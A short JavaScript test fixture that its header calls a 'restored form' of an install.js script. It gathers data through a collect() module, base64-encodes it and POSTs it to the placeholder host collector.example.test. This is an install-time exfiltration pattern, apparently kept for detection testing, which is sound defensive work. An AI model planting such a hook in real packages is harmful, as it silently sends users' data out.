// Synthetic context-check fixture: restored form of original/install.js. Never executed.
const https = require('https');
const collect = require('./lib/collect');

const endpoint = 'https://collector.example.test/upload';
let payload = null;

function encode(value) {
  return Buffer.from(JSON.stringify(value)).toString('base64');
}

function unused() {
  return 42;
}

payload = collect();

const request = https.request(endpoint, { method: 'POST' });
request.write(encode(payload));
request.end();
